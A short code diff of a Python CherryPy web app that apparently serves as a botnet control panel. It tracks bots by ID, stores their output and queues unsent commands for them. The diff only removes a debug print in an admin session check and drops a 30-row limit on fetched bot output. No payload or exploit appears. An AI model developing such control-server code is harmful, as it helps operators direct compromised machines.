@@ -76,7 +76,6 @@ def require_admin(func):
         global last_session_activity
         global SESSION_TIMEOUT
         if session_cookie and COOKIE_NAME in cherrypy.request.cookie and session_cookie == cherrypy.request.cookie[COOKIE_NAME].value:
-            print time.time() - last_session_activity
             if time.time() - last_session_activity > SESSION_TIMEOUT:
                 raise cherrypy.HTTPRedirect("/disconnect")
             else:
@@ -206,7 +205,7 @@ class API(object):
         if not validate_botid(botid):
             raise cherrypy.HTTPError(403)
         output = ""
-        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC LIMIT 30', (botid,))
+        bot_output = query_DB('SELECT * FROM output WHERE bot=? ORDER BY date DESC', (botid,))
         for entry in reversed(bot_output):
             output += "%s\n\n" % entry[2]
         bot_queue = query_DB('SELECT * FROM commands WHERE bot=? and sent=? ORDER BY date', (botid, 0))
